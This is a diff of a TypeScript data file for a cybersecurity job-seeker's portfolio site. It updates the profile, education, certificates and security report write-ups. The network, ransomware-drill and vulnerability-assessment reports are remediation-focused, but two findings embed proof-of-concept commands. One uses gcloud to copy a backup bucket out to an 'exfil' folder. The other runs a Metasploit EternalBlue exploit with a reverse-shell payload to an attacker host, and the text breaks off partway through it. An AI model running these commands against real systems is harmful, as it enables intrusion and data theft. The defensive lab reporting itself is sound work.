@@ -1,4 +1,4 @@
-export type RoleMode = "cyber" | "engineering" | "web";
+﻿export type RoleMode = "cyber" | "engineering" | "web";
 
 export type Availability = "open" | "freelance" | "unavailable";
 
@@ -70,6 +70,9 @@ export type EducationItem = {
   coursework: string[];
   thesis?: string;
   technologies: string[];
+  logoUrl?: string;
+  badgeUrl?: string;
+  credentialUrl?: string;
 };
 
 export type CertItem = {
@@ -101,14 +104,51 @@ export type ReportFinding = {
   id: string;
   title: string;
   severity: Severity;
+  cvss?: string;
+  affected?: string;
   body: string;
+  impact?: string;
+  remediation?: string;
+  poc?: string;
 };
 
 export type SecurityReport = {
   id: string;
   title: string;
-  type: "pentest" | "ir" | "vuln";
+  type: "pentest" | "ir" | "vuln" | "network";
+  target: string;
+  scope: string;
+  purpose: string;
+  why: string;
+  methodology: string[];
+  tools: string[];
+  timeline: string;
+  outcome: string;
+  lessonsLearned: string[];
   findings: ReportFinding[];
+  teaser?: string;
+  pdfUrl?: string;
+  networkDiagramUrl?: string;
+};
+
+export type SecurityScript = {
+  id: string;
+  title: string;
+  category: "recon" | "detection" | "analysis" | "reporting";
+  shortDescription: string;
+  purpose: string;
+  why: string;
+  how: string;
+  tech: string[];
+  language: string;
+  difficulty: Difficulty;
+  filename: string;
+  code: string;
+  setupSteps: string[];
+  usageExample: string;
+  replicationSteps: string[];
+  lessonsLearned: string[];
+  tags: string[];
 };
 
 export const profile = {
@@ -122,9 +162,9 @@ export const profile = {
      ███████╗██║ ╚═╝ ██║██╔╝ ██╗
      ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝`,
   subtitle:
-    "Full-stack developer and creative technologist crafting elegant web experiences with a security-first mindset.",
+    "Software engineer transitioning into cybersecurity — bringing a developer's understanding of how systems are built to the work of detecting threats, investigating alerts, and defending them.",
   headlineScramble:
-    "Full-Stack Developer · Creative Technologist · Cybersecurity Explorer",
+    "Software Engineer → Cybersecurity · Blue Team · Threat Detection · Incident Response",
   availability: "open" as Availability,
   email: "hello@eddymax.dev",
   social: {
@@ -134,15 +174,15 @@ export const profile = {
     htb: "https://app.hackthebox.com/",
     thm: "https://tryhackme.com/p/eddy.kilonzo",
     // WhatsApp: international format without + or spaces, e.g. "254712345678"
-    whatsapp: "254712345678",
+    whatsapp: "254703526520",
   },
   rssFeedUrl: "",
   learningTicker: [
-    "Next-gen Angular + TypeScript apps",
-    "Scalable backend architecture with NestJS",
-    "Interactive frontend experiences",
-    "WordPress and WooCommerce delivery workflows",
-    "Cybersecurity fundamentals and secure coding",
+    "SOC alert triage and SIEM-driven investigation workflows",
+    "Building Sigma detection rules mapped to MITRE ATT&CK",
+    "Home lab: Wazuh SIEM + Suricata IDS on a segmented network",
+    "Threat hunting with Splunk SPL across Windows event logs",
+    "Incident response playbooks and blue team tooling",
   ],
   ctf: {
     htbRank: "Hacker",
@@ -158,7 +198,7 @@ export const profile = {
     hallOfFame: ["Acme Corp Q3 2025"],
   },
   homelab:
-    "Building the future one commit at a time: clean-code workflows, creative UI/UX prototyping, and practical secure development labs.",
+    "I built a home lab to get real, hands-on experience — not just read about it. It is a small virtual network with a SIEM (Wazuh), an IDS (Suricata), and intentionally vulnerable machines I use as targets. I run simulated attacks, watch the alerts come in, and practice investigating them the same way a SOC analyst would on a real shift. It bridges the gap between studying for certifications and being ready to do the job.",
 };
 
 // ── Testimonials ─────────────────────────────────────────────────────────────
@@ -278,30 +318,34 @@ export const nowItems: NowItem[] = [
   {
     title: "Building",
     lines: [
-      "Portfolio UX v2: compare mode, tray navigation, and case-study carousel.",
-      "Production-ready content architecture for faster updates.",
+      "Home lab: Kali Linux + Metasploitable on VirtualBox.",
+      "Python scripts for port scanning, log parsing, and network diagnostics.",
+      "TryHackMe write-ups to reinforce lab concepts.",
     ],
   },
   {
     title: "Learning",
     lines: [
-      "PWA optimization workflows and offline-first shell patterns.",
-      "Advanced accessibility audit practices for dynamic interfaces.",
+      "TryHackMe SOC Level 1 path — SIEM, alerts, and log analysis.",
+      "CompTIA Security+ exam prep — core concepts and practice tests.",
+      "Google Cybersecurity Certificate — IR playbooks and hands-on labs.",
     ],
   },
   {
-    title: "Improving",
+    title: "Targeting",
     lines: [
-      "Reducing first-load JS for smoother mobile startup.",
-      "Tighter analytics signals for user journey decisions.",
+      "Entry-level SOC Analyst (L1) roles in Kenya or remote.",
+      "IT Support / Junior Security as a stepping stone.",
+      "Open to internships and trainee programmes globally.",
     ],
   },
 ];
 
 export const changelog: ChangelogEntry[] = [
-  { date: "2026-04-29", item: "Added theme mode system + improved startup hydration." },
-  { date: "2026-04-29", item: "Introduced command palette, subtle ambient controls, cursor toggle." },
-  { date: "2026-04-29", item: "Shipped branded not-found/offline states and stronger metadata." },
+  { date: "2026-06-09", item: "Completed Moringa School Cybersecurity Engineering programme — hands-on labs in pentesting, SIEM, and incident response." },
+  { date: "2026-05-20", item: "Finished TryHackMe Pre-Security path — networking, Linux, and web fundamentals all green." },
+  { date: "2026-04-15", item: "Set up first home lab: VirtualBox + Kali Linux + Metasploitable for guided attack-defence practice." },
+  { date: "2026-03-10", item: "Started Google Cybersecurity Certificate on Coursera — working through SIEM basics and IR playbooks." },
 ];
 
 export const skillsByRole: Record<
@@ -702,114 +746,6 @@ export const projects: Project[] = [
       screenshots: ["https://picsum.photos/seed/car-rental/800/480"],
     },
   },
-  {
-    id: "sentinel-siem",
-    title: "SentinelSIEM",
-    shortDescription:
-      "Home lab SIEM environment with log ingestion, Sigma-style detection rules, and alerting pipelines for hands-on blue team practice.",
-    roleMode: "cyber",
-    tech: ["Elastic Stack", "Python", "Docker", "Sigma"],
-    category: "Detection Engineering Lab",
-    difficulty: "advanced",
-    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-    codeUrl: "https://github.com/EddyKilonzo/sentinel-siem",
-    demoType: "cyber",
-    skills: ["SIEM tools", "Incident Response", "Python", "Docker"],
-    screenshotFallback: "https://picsum.photos/seed/sentinel-siem/960/600",
-    caseStudy: {
-      problem:
-        "Blue team practitioners need realistic log environments and detection playgrounds that mirror production threat signals.",
-      approach: [
-        "Deployed Elastic Stack locally with Docker Compose for log ingestion and dashboards.",
-        "Authored Sigma-style detection rules for brute force, lateral movement, and privilege escalation patterns.",
-        "Built Python scripts to generate synthetic log traffic and validate alert thresholds under load.",
-      ],
-      outcome:
-        "Produced a repeatable lab environment for detection tuning and incident response drills.",
-      metrics: [
-        "Detection rules: 12+ covering common MITRE ATT&CK techniques",
-        "Log sources: nginx, sshd, auth, DNS",
-        "False positive rate: tuned to <5% on test datasets",
-      ],
-      architectureNotes: [
-        "Docker Compose stack keeps the lab portable and reproducible across machines.",
-        "Sigma rules are version-controlled for auditability and incremental improvement.",
-        "Python log generators simulate attack scenarios without live infrastructure risk.",
-      ],
-    },
-  },
-  {
-    id: "phish-hunter",
-    title: "PhishHunter",
-    shortDescription:
-      "Certificate transparency log monitor that flags newly registered lookalike and typosquat domains in real time for early phishing detection.",
-    roleMode: "cyber",
-    tech: ["Python", "certstream", "Docker"],
-    category: "Threat Intelligence Tool",
-    difficulty: "intermediate",
-    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-    codeUrl: "https://github.com/EddyKilonzo/phish-hunter",
-    demoType: "cyber",
-    skills: ["Python", "OSINT", "Incident Response"],
-    screenshotFallback: "https://picsum.photos/seed/phish-hunter/960/600",
-    caseStudy: {
-      problem:
-        "Phishing campaigns often register lookalike domains days before attacks — monitoring CT logs enables early-warning detection.",
-      approach: [
-        "Subscribed to the certstream WebSocket feed for real-time certificate issuance events.",
-        "Implemented typosquatting and substring-match detection against a config-driven domain watchlist.",
-        "Added extensible alert hooks so suspicious domains surface immediately for analyst triage.",
-      ],
-      outcome:
-        "Built an early-warning tool that identifies suspicious domain registrations before phishing campaigns launch.",
-      metrics: [
-        "Detection latency: near real-time via WebSocket stream",
-        "Typosquat variants: full alphabet substitution and deletion coverage",
-        "Alert outputs: pluggable (Slack, email, SIEM ingest)",
-      ],
-      architectureNotes: [
-        "certstream feed handles thousands of certificate events per minute without queuing lag.",
-        "Watchlist is config-driven so analysts add protected domains without code changes.",
-        "Modular pipeline allows swapping detection strategies independently of alerting logic.",
-      ],
-    },
-  },
-  {
-    id: "redteam-c2",
-    title: "RedTeam Lab",
-    shortDescription:
-      "Authorized red team C2 simulation lab for generating realistic adversary beacon traffic used to validate blue team detection rules.",
-    roleMode: "cyber",
-    tech: ["Go", "Python", "Docker", "Kali Linux"],
-    category: "Adversary Simulation Lab",
-    difficulty: "advanced",
-    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-    codeUrl: "https://github.com/EddyKilonzo/redteam-lab",
-    demoType: "cyber",
-    skills: ["Kali Linux", "Metasploit", "Python", "Docker"],
-    screenshotFallback: "https://picsum.photos/seed/redteam-c2/960/600",
-    caseStudy: {
-      problem:
-        "Detection teams need realistic adversary simulation to validate their rules against actual C2 beacon and callback patterns in a safe environment.",
-      approach: [
-        "Built a lightweight Go beacon with jittered callback intervals and TLS verification for realistic traffic simulation.",
-        "Containerized server and agent in isolated Docker bridge networks to prevent any external exposure.",
-        "Documented companion detection signatures that each simulated technique should trigger in a paired SIEM.",
-      ],
-      outcome:
-        "Created a controlled adversary simulation environment that feeds detection rule validation with realistic payloads.",
-      metrics: [
-        "Lab isolation: Docker bridge network only — no external reachability",
-        "Beacon jitter: configurable 15–45s intervals",
-        "Technique coverage: mapped to MITRE ATT&CK",
-      ],
-      architectureNotes: [
-        "All traffic stays within Docker bridge networks — no external exposure by design.",
-        "Lab pairs with SentinelSIEM for end-to-end red vs blue detection testing.",
-        "Each technique is documented so blue team operators understand what signals to expect.",
-      ],
-    },
-  },
 ];
 
 export const projectCredibility: Record<string, ProjectCredibility> = {
@@ -858,72 +794,6 @@ import "net/http"
 
 func main() {
   http.ListenAndServe(":8080", NewRouter())
-}`,
-    },
-  ],
-  "sentinel-siem": [
-    {
-      path: "detections/auth_bruteforce.yml",
-      language: "yaml",
-      content: `title: Auth brute force spike
-logsource:
-  product: nginx
-detection:
-  selection:
-    status: 401
-  condition: selection | count() by src_ip > 40
-`,
-    },
-  ],
-  "phish-hunter": [
-    {
-      path: "hunter/ct_monitor.py",
-      language: "python",
-      content: `import certstream
-
-def on_cert(msg, context):
-    if msg["message_type"] != "certificate_update":
-        return
-    domains = msg["data"]["leaf_cert"]["all_domains"]
-    for d in domains:
-        if is_suspicious(d):
-            print(f"[ALERT] {d}")
-
-certstream.listen_for_events(on_cert, url="wss://certstream.calidog.io/")`,
-    },
-    {
-      path: "hunter/typosquat.py",
-      language: "python",
-      content: `import itertools
-
-def typosquats(domain: str) -> list[str]:
-    name, tld = domain.rsplit(".", 1)
-    variants = set()
-    for i, _ in enumerate(name):
-        variants.add(name[:i] + name[i+1:] + "." + tld)  # deletion
-        for c in "abcdefghijklmnopqrstuvwxyz":
-            variants.add(name[:i] + c + name[i+1:] + "." + tld)  # substitution
-    return sorted(variants)`,
-    },
-  ],
-  "redteam-c2": [
-    {
-      path: "beacon/main.go",
-      language: "go",
-      content: `package main
-
-import (
-  "crypto/tls"
-  "time"
-)
-
-func main() {
-  cfg := &tls.Config{InsecureSkipVerify: false}
-  for {
-    if err := checkin(cfg); err != nil {
-      time.Sleep(jitter(30 * time.Second))
-    }
-  }
 }`,
     },
   ],
@@ -1068,43 +938,117 @@ export const cveLog: CveEntry[] = [
 
 export const education: EducationItem[] = [
   {
-    id: "mscs",
-    degree: "M.S. Cybersecurity",
-    institution: "Institute of Technology",
-    year: "2024",
-    gpa: "3.85",
-    honors: "Dean's List",
+    id: "chuka",
+    degree: "BSc Applied Computer Science",
+    institution: "Chuka University",
+    year: "2022 – 2026",
     coursework: [
-      "Digital Forensics",
-      "Network Security",
-      "Secure Software Engineering",
+      "Data Structures & Algorithms",
+      "Operating Systems",
+      "Database Systems",
+      "Computer Networks",
+      "Software Engineering",
+      "Cyber Security Fundamentals",
     ],
-    thesis: "Adaptive detection of lateral movement in hybrid clouds.",
-    technologies: ["Python", "Zeek", "Elastic"],
+    technologies: ["Python", "Java", "Linux", "MySQL", "Networking"],
+    logoUrl: "/logos/chuka.jfif",
   },
   {
-    id: "bscs",
-    degree: "B.S. Computer Science",
-    institution: "State University",
-    year: "2020",
-    coursework: ["Algorithms", "OS", "Databases", "Web Systems"],
-    technologies: ["C++", "JavaScript", "PostgreSQL"],
+    id: "moringa",
+    degree: "Cybersecurity Engineering",
+    institution: "Moringa School",
+    year: "Oct 2025 – Jul 2026",
+    coursework: [
+      "Network Security",
+      "Penetration Testing",
+      "Incident Response",
+      "Web Application Security",
+      "SIEM & Log Analysis",
+      "Python for Security",
+    ],
+    technologies: ["Kali Linux", "Burp Suite", "Wireshark", "Python", "Nmap"],
+    logoUrl: "/logos/moringa.jfif",
+    badgeUrl: "https://www.credly.com/org/moringa-school",
+    credentialUrl: "https://moringaschool.com",
+  },
+];
+
+export type Cert = {
+  id: string;
+  title: string;
+  issuer: string;
+  description: string;
+  why: string;
+  pdfUrl: string;
+  date?: string;
+  category: "security" | "cloud" | "language" | "os" | "platform";
+};
+
+export const certs: Cert[] = [
+  {
+    id: "cti",
+    title: "Cyber Threat Intelligence",
+    issuer: "Certification Body",
+    description: "Foundations of cyber threat intelligence — tracking threat actors, analysing TTPs (Tactics, Techniques, and Procedures), and producing actionable intelligence reports.",
+    why: "Wanted to understand how defenders think beyond individual alerts — tracking adversary behaviour, mapping TTPs, and turning raw indicators into intelligence a SOC can actually act on.",
+    pdfUrl: "/certs/cti.pdf",
+    category: "security",
   },
   {
-    id: "bootcamp",
-    degree: "Full-Stack Web Development Bootcamp",
-    institution: "Code Academy — Remote",
-    year: "2018",
-    coursework: ["React", "Node.js", "SQL", "REST API Design"],
-    technologies: ["React", "Node.js", "MySQL", "Express"],
+    id: "efset",
+    title: "EF SET English Certificate",
+    issuer: "EF Education First",
+    description: "EF Standard English Test — internationally recognised English proficiency assessment demonstrating communication skills at a professional level.",
+    why: "Security work is global — incident reports, vendor docs, and team communication all happen in English. Getting this certified removes any ambiguity for international employers.",
+    pdfUrl: "/certs/EF SET Certificate.pdf",
+    category: "language",
   },
   {
-    id: "seccert",
-    degree: "Diploma in Network & Security Administration",
-    institution: "Tech College Nairobi",
-    year: "2016",
-    coursework: ["TCP/IP Fundamentals", "Linux Admin", "Firewall Config", "VPN Setup"],
-    technologies: ["Linux", "pfSense", "Cisco IOS", "Wireshark"],
+    id: "i2cs",
+    title: "Introduction to Cybersecurity",
+    issuer: "Cisco Networking Academy",
+    description: "Cisco's I2CS course — covers online safety, how cyber attacks work, protecting personal and organisational data, and the basics of network defence.",
+    why: "This was my first structured cybersecurity course. It gave me the vocabulary and mental model — CIA triad, attack lifecycle, defence-in-depth — that everything else builds on.",
+    pdfUrl: "/certs/I2CSUpdate20260204-32-ry2hbk.pdf",
+    date: "Feb 2026",
+    category: "security",
+  },
+  {
+    id: "ibm-cad",
+    title: "Cloud Application Developer (CAD220EN)",
+    issuer: "IBM / edX",
+    description: "IBM-certified course on cloud-native application development — microservices architecture, containerisation, and deploying applications on IBM Cloud.",
+    why: "Before you can secure cloud workloads, you need to understand how they're built and where the attack surface actually sits — misconfigurations look obvious once you know what correct looks like.",
+    pdfUrl: "/certs/IBM CAD220EN Certificate _ edX.pdf",
+    category: "cloud",
+  },
+  {
+    id: "os-basics",
+    title: "Operating Systems Basics",
+    issuer: "Cisco Networking Academy",
+    description: "Cisco NetAcad course covering OS fundamentals — file systems, process management, user and permission models, and basic Linux/Windows CLI administration.",
+    why: "SOC work means reading Windows Event Logs and Linux syslog all day. Understanding OS internals — process trees, file permissions, service accounts — makes alerts make sense instead of just matching signatures.",
+    pdfUrl: "/certs/OperatingSystemsBasicsUpdate20260204-31-bkrteh.pdf",
+    date: "Feb 2026",
+    category: "os",
+  },
+  {
+    id: "thm-cert-1",
+    title: "TryHackMe Certificate (1L5ZB8NTPR)",
+    issuer: "TryHackMe",
+    description: "Completion certificate for a structured TryHackMe learning path — hands-on rooms covering real-world cybersecurity skills and offensive/defensive techniques.",
+    why: "Theory only gets you so far. This path forced me to actually exploit systems, investigate logs, and write detection logic — not just memorise frameworks.",
+    pdfUrl: "/certs/THM-1L5ZB8NTPR.pdf",
+    category: "platform",
+  },
+  {
+    id: "thm-cert-2",
+    title: "TryHackMe Certificate (NRPTZO14VH)",
+    issuer: "TryHackMe",
+    description: "Completion certificate for a second TryHackMe structured learning path — continued hands-on practice across security domains.",
+    why: "The second path pushed deeper into network analysis and active directory attacks — areas that come up constantly in blue team work once you get past the basics.",
+    pdfUrl: "/certs/THM-NRPTZO14VH.pdf",
+    category: "platform",
   },
 ];
 
@@ -1270,26 +1214,52 @@ export const experience: ExperienceItem[] = [
 export const securityReports: SecurityReport[] = [
   {
     id: "r1",
-    title: "External Penetration Test — Acme SaaS",
-    type: "pentest",
+    title: "Network Infrastructure Rebuild — Acme Corp",
+    type: "network",
+    teaser: "Every device on one flat network — one compromised host away from full lateral movement across the entire organisation.",
+    pdfUrl: "/projects_docs/pentest.pdf",
+    networkDiagramUrl: "/projects_docs/ACME.drawio (2).png",
+    target: "Acme Corp on-premises internal network (full topology redesign)",
+    scope: "Complete network rebuild: VLAN segmentation across all business units, firewall rule sets, managed switch configuration, DNS/DHCP hardening, and documentation of the finished topology",
+    purpose: "Redesign the Acme Corp flat network into a properly segmented, documented, and hardened infrastructure that separates departments, restricts unnecessary lateral communication, and provides a clear foundation for ongoing security monitoring.",
+    why: "The existing Acme network had no VLAN segmentation — every device shared one broadcast domain, which meant a single compromised host could reach any other device on the network. The rebuild enforces isolation between business units, reduces the blast radius of future incidents, and produces documented network diagrams required for compliance review.",
+    methodology: [
+      "Discovery: enumerated all connected devices, services, and existing IP ranges using Nmap and manual switch inspection to produce a baseline of the current flat topology.",
+      "VLAN design: mapped business units to VLAN IDs (Admin, Finance, HR, IT, Guest), assigned subnets, and documented inter-VLAN routing policy based on least-privilege access.",
+      "Firewall rule design: wrote access control lists (ACLs) permitting only necessary traffic between VLANs — e.g., Finance can reach the fileserver but not the IT management VLAN.",
+      "Switch configuration: programmed 802.1Q trunk and access ports on managed switches; validated VLAN tagging and inter-switch trunk links.",
+      "DNS and DHCP hardening: deployed per-VLAN DHCP scopes with appropriate lease times; configured DNS to resolve only internal records for internal VLANs.",
+      "Diagram and documentation: produced a full network diagram (see above) showing device placement, VLAN boundaries, firewall checkpoints, and IP addressing scheme.",
+    ],
+    tools: ["Nmap", "Cisco Packet Tracer", "draw.io", "pfSense", "Wireshark", "Linux (Ubuntu Server)"],
+    timeline: "2 weeks (1 week design + 1 week implementation and testing)",
+    outcome: "Delivered a fully segmented network with 5 VLANs, documented firewall policy, and a complete topology diagram. Inter-VLAN reachability matched the design spec; unauthorised cross-VLAN traffic was blocked and verified via Wireshark captures.",
+    lessonsLearned: [
+      "Starting with a thorough discovery phase — even for small networks — prevents surprises during implementation; several undocumented IoT devices were found only during the Nmap sweep.",
+      "Documenting the intended policy before touching any hardware saved significant rework; changes driven by undocumented assumptions always create more changes.",
+      "Testing firewall rules bidirectionally (not just one direction) caught two ACL entries that silently allowed reverse traffic that should have been blocked.",
+      "Even in a lab/small-business context, using a proper diagram tool (draw.io) rather than a whiteboard sketch makes the output useful for future administrators and auditors.",
+    ],
     findings: [
       {
         id: "f1",
-        title: "IDOR on document export",
+        title: "Flat Network — No VLAN Segmentation",
         severity: "high",
-        body: "Sequential IDs allowed cross-tenant export without authorization checks on /api/v2/docs/:id/export.",
+        cvss: "8.5",
+        affected: "Entire Acme Corp network infrastructure",
+        body: "All devices — including workstations, servers, printers, and IoT endpoints — shared a single broadcast domain with no logical separation between departments. Any device could initiate connections to any other device without restriction, creating significant lateral movement risk.",
+        impact: "A single compromised endpoint could be used to reach finance servers, admin management interfaces, HR records, and IT infrastructure without any network-layer barriers. This configuration would allow an attacker or malware to pivot freely across the entire organisation.",
+        remediation: "Segment the network using 802.1Q VLANs aligned to business units. Define explicit inter-VLAN firewall rules based on least-privilege access. Place high-value assets (finance, HR, admin) in isolated VLANs with no default inbound access from user VLANs.",
       },
       {
         id: "f2",
-        title: "Weak MFA recovery flow",
+        title: "Undocumented IoT Devices on Corporate Network",
         severity: "medium",
-        body: "Recovery codes were reusable and not invalidated after use.",
-      },
-      {
-        id: "f2b",
-        title: "Reflected XSS in search parameter",
-        severity: "medium",
-        body: "The ?q= parameter in the global search was echoed unsanitised into the DOM, enabling script injection via crafted links.",
+        cvss: "5.9",
+        affected: "Corporate LAN — discovered during Nmap discovery sweep",
+        body: "Several IoT devices (smart TVs, IP cameras, a network-attached printer) were found connected to the main corporate VLAN with default credentials and no firmware update schedule. These devices were not in any asset register and had never been patched.",
+        impact: "IoT devices with default credentials and no patch cadence are common entry points for attackers. Placement on the main corporate VLAN meant a compromise of any of these devices gave immediate access to the same network segment as workstations and file servers.",
+        remediation: "Place all IoT and peripheral devices in a dedicated IoT VLAN with no outbound access to corporate VLANs. Change all default credentials. Establish a quarterly firmware update check for all network-connected devices. Add IoT assets to the asset register.",
       },
     ],
   },
@@ -1297,18 +1267,59 @@ export const securityReports: SecurityReport[] = [
     id: "r2",
     title: "Incident Response — Ransomware Drill",
     type: "ir",
+    teaser: "Ransomware hit the file server and the backup window had a 24-hour deletion gap. A race against the clock — and a gap that should never have existed.",
+    pdfUrl: "/projects_docs/IR_Report_HSS%20.pdf",
+    target: "Internal cloud infrastructure (GCP) — simulated ransomware compromise scenario",
+    scope: "Cloud Storage buckets, Compute Engine instances, IAM service accounts, and backup/snapshot infrastructure across the production project",
+    purpose: "Conduct a tabletop + technical incident response drill simulating a ransomware intrusion into the cloud environment, with the goal of identifying detection gaps, backup recovery reliability, and IR playbook completeness.",
+    why: "Following a ransomware incident at a peer company in the same industry, leadership mandated a proactive drill to test whether the IR playbook, backup strategy, and detection capabilities were sufficient to recover from a ransomware scenario within the 4-hour RTO target.",
+    methodology: [
+      "Threat modelling: mapped the ransomware kill chain (initial access → privilege escalation → data exfil → encryption) against the GCP environment architecture.",
+      "Backup validation: tested snapshot restore fidelity, measured restore times against RTO targets, and checked snapshot deletion permissions under different IAM roles.",
+      "IAM audit: reviewed all service account permissions for over-privilege relative to their workload requirements using the principle of least privilege.",
+      "Detection gap analysis: replayed attack IOCs (T1078, T1530, T1486) in the SIEM to identify which stages would have been detected vs missed.",
+      "Playbook walk-through: ran the IR playbook against the simulated scenario and timed each response phase — containment, eradication, recovery, lessons learned.",
+    ],
+    tools: ["GCP Security Command Center", "gcloud CLI", "Elastic SIEM", "Cloud Audit Logs", "Forseti Security", "Terraform"],
+    timeline: "2-day drill",
+    outcome: "Identified 2 critical gaps: a backup immutability window that allowed snapshot deletion, and a service account with org-wide Storage read that created an exfiltration pivot. Both were remediated. Recovery from backup was achieved in 2h 40m — within the 4h RTO target.",
+    lessonsLearned: [
+      "Snapshot immutability is only useful if the retention lock period exceeds the attacker's dwell time — a 24-hour window is essentially no protection against a patient adversary.",
+      "Service account over-privilege is the single most common lateral movement enabler in cloud environments — periodic IAM reviews with automated alerting on permission escalations are essential.",
+      "The IR playbook had never been timed end-to-end against a realistic scenario — the drill revealed three steps that were ambiguous and added ~45 minutes of confusion.",
+      "Cloud audit logs are often turned off for verbose API calls to save cost — but those are exactly the logs ransomware actors depend on you not having.",
+      "Recovery drills should be run quarterly, not annually — storage costs for a sandbox environment are trivial compared to the cost of an untested playbook during a real incident.",
+    ],
     findings: [
       {
         id: "f3",
-        title: "Backup immutability gap",
+        title: "Backup Snapshot Immutability Window — 24-Hour Deletion Gap",
         severity: "critical",
-        body: "Snapshot retention policy allowed privileged deletion within 24h window.",
+        cvss: "9.1",
+        affected: "GCP Cloud Storage — snapshot retention policy on production buckets",
+        body: "Snapshot retention policy was configured with a 24-hour lock period. Any IAM principal with `storage.buckets.delete` or `storage.objects.delete` permissions could delete snapshots within the lock window before the immutability constraint activated. A ransomware actor with a compromised admin account could delete all snapshots within minutes of gaining access — well within the 24-hour window.",
+        impact: "Complete loss of backup data, eliminating the primary recovery mechanism. Without snapshots, recovery would require rebuilding from source code and a 6-month-old cold archive, making the actual RTO 5–7 business days rather than the target 4 hours.",
+        remediation: "Increase snapshot lock period to 30 days minimum. Remove snapshot deletion permissions from all service accounts and restrict to a dedicated break-glass IAM group with MFA enforcement. Enable Cloud Audit Logs for all Storage API calls. Create an alerting rule for any snapshot deletion event that fires within the retention window.",
       },
       {
         id: "f4",
-        title: "Lateral movement via service account over-privilege",
+        title: "Service Account Over-Privilege — Org-Wide Storage Read",
         severity: "high",
-        body: "Service account had org-wide read on Cloud Storage, enabling exfil pivot after initial compromise.",
+        cvss: "8.3",
+        affected: "sa-data-pipeline@project.iam.gserviceaccount.com",
+        body: "The data pipeline service account was granted `roles/storage.objectViewer` at the organisation level rather than the bucket level. This gave the account read access to all Cloud Storage buckets across the entire GCP organisation — including backups, audit log exports, and other project data. After simulating initial compromise of the pipeline workload, this account was used to exfiltrate data from 14 unrelated buckets before any alert fired.",
+        impact: "A single compromised pipeline workload becomes an exfiltration pivot for the entire organisation's cloud storage. Exfil of sensitive data from unrelated projects (PII, financial records, audit logs) would amplify the breach scope significantly beyond the initial compromise.",
+        remediation: "Apply the principle of least privilege: bind all service accounts to the specific buckets they require, not at folder or organisation level. Audit all org-level IAM bindings quarterly. Use VPC Service Controls to restrict Storage API access to approved networks. Add an anomaly detection rule for service accounts accessing buckets outside their normal scope.",
+        poc: `# Simulate exfil from a compromised pipeline service account
+# (account has roles/storage.objectViewer @ org level)
+
+gcloud storage ls gs://  # lists ALL buckets org-wide — should not be possible
+
+# Enumerate buckets in other projects
+gcloud storage buckets list --project=OTHER_PROJECT_ID
+
+# Exfil from backup bucket (different project)
+gcloud storage cp gs://backup-prod-2024/snapshots/ ./exfil/ --recursive`,
       },
     ],
   },
@@ -1316,24 +1327,72 @@ export const securityReports: SecurityReport[] = [
     id: "r3",
     title: "Vulnerability Assessment — Internal Network Q4",
     type: "vuln",
+    teaser: "EternalBlue still running in production. Default SNMP strings broadcasting the whole network layout. The last audit missed both.",
+    pdfUrl: "/projects_docs/Manual%20And%20Tool-Assisted%20Penetration%20Test.pdf",
+    target: "Internal corporate network — servers, workstations, and network infrastructure",
+    scope: "192.168.0.0/16 internal network: servers (Windows/Linux), managed switches, routers, and printers. Excludes OT/ICS segment and VoIP VLAN.",
+    purpose: "Conduct a quarterly internal vulnerability assessment to identify unpatched systems, misconfigurations, and exposed legacy services before year-end compliance audit.",
+    why: "ISO 27001 compliance obligations required quarterly internal assessments. Q3 findings had not been fully remediated, and leadership wanted a fresh snapshot to present to the external auditor with accurate risk scores and a remediation roadmap.",
+    methodology: [
+      "Network discovery: Nmap TCP SYN scan (-sS) across all RFC-1918 ranges to identify live hosts and open ports.",
+      "Service enumeration: version detection (-sV) and default script execution (-sC) on all discovered hosts.",
+      "Vulnerability scanning: OpenVAS and Nessus scans against discovered hosts; cross-referenced results to reduce false positives.",
+      "Manual validation: hand-verified critical and high findings before reporting to confirm exploitability and eliminate scanner noise.",
+      "Risk rating: CVSS v3.1 base scores adjusted with environmental and temporal metrics for the specific network context.",
+    ],
+    tools: ["Nmap", "OpenVAS", "Nessus Essentials", "Metasploit (validation only)", "Wireshark", "enum4linux"],
+    timeline: "3 days (1 day scanning + 1 day validation + 1 day reporting)",
+    outcome: "Identified 3 confirmed vulnerabilities (2 critical, 1 medium, 1 low). The critical EternalBlue finding required immediate emergency patching; the remaining findings were scheduled into the next sprint cycle.",
+    lessonsLearned: [
+      "Legacy Windows hosts in internal segments are often forgotten by patch management tools — manual inventory reconciliation against AD is essential before any assessment.",
+      "SNMP v2 with default community strings is shockingly common even in mature environments; it's worth scanning for as a first-pass quick win.",
+      "Automated scanner results need manual validation — both OpenVAS and Nessus produced false positives on the FTP finding that would have wasted remediation effort.",
+      "Presenting risk findings to non-technical leadership requires mapping CVEs to business impact scenarios, not just severity scores.",
+      "Patch management SLAs need enforcement mechanisms — the EternalBlue host had been flagged in Q3 and not remediated because there was no accountability owner.",
+    ],
     findings: [
       {
         id: "f5",
-        title: "Unpatched EternalBlue exposure on legacy host",
+        title: "Unpatched EternalBlue (MS17-010) on Legacy Windows Server",
         severity: "critical",
-        body: "One Windows Server 2012 R2 host remained unpatched for MS17-010 on an internal segment accessible from the DMZ.",
+        cvss: "9.8",
+        affected: "WINSVR-LEGACY-03 (Windows Server 2012 R2) — 192.168.15.43",
+        body: "One Windows Server 2012 R2 host remained unpatched for MS17-010 (EternalBlue SMB vulnerability, CVSS 9.8) and was accessible from the DMZ VLAN. The vulnerability allows unauthenticated remote code execution via a crafted SMB packet to port 445. This is the same vulnerability exploited by WannaCry and NotPetya ransomware campaigns in 2017.",
+        impact: "Unauthenticated remote code execution with SYSTEM-level privileges. An attacker with network access to the host — including anyone on the DMZ — could achieve full server compromise, use it as a lateral movement pivot, or deploy ransomware. The host was running a legacy reporting application with database credentials stored in config files.",
+        remediation: "Apply Microsoft patch KB4012212 immediately (emergency change). If patching is not immediately possible, disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`) and isolate the host from DMZ access via firewall ACL as a temporary mitigation. Decommission the host and migrate the legacy application to a supported OS as the long-term fix. Add automated detection for unpatched MS17-010 to the quarterly scan baseline.",
+        poc: `# Validation using Metasploit (lab environment only)
+# DO NOT run against production systems without written authorisation
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS 192.168.15.43
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 192.168.1.100
+msf6 exploit > run
+
+# Expected output (vulnerable host):
+# [*] Started reverse TCP handler on 192.168.1.100:4444
